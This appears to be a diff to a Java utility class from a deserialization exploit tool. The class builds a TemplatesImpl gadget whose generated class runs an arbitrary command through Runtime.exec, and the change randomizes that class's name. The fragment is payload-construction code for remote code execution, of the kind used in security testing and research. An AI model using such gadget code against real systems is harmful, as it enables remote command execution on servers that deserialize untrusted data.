@@ -15,6 +15,7 @@ import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.ObjectOutputStream;
 import java.lang.reflect.Field;
+import java.util.Random;
 
 public class Util {
     public byte[] serialize(Object object) {
@@ -60,7 +61,7 @@ public class Util {
 
     public TemplatesImpl createTemplates(String command) {
         ClassPool pool = ClassPool.getDefault();
-        CtClass ctClass = pool.makeClass("Foo");
+        CtClass ctClass = pool.makeClass("Foo" + new Random().nextInt(10));
         String commandTemplate = "java.lang.Runtime.getRuntime().exec(\"%s\");";
         byte[] bytes = new byte[1024];
         try {
